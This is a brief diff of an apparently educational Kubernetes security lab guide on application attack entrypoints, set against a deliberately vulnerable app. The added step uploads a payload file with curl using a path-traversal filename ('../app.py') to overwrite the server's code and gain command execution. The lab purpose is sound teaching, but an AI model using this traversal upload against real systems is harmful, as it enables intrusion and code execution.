@@ -75,7 +75,8 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
             return p.stdout.decode()
         ...
     ```
-    - try to browse [http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls](http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls), get Unauthorized
+    <!-- - try to browse [http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls](http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls), get Unauthorized -->
+    - upload the payload via `curl`:
     ```sh
     TOKEN=<your token>
     curl -vv -o /tmp/out.html -F "file=@payloads/app.py; filename=../app.py" "http://images.vulnerable-app.seck8s.slurm.io/?token=$TOKEN"
